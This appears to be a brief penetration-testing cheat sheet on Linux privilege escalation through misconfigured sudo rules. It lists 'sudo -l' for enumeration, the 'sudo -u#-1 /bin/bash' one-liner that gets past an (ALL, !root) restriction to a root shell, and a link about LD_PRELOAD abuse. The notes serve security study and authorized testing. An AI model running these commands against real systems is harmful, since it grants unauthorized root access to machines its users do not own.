# Misconfigured sudo commands
## Checks
```
sudo -l
```
### Bypass (ALL, !root) /bin/bash ||| (ALL, !root) ALL
```
sudo -u#-1 /bin/bash
```
### Abuse env_keep+=LD_PRELOAD
```
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
```
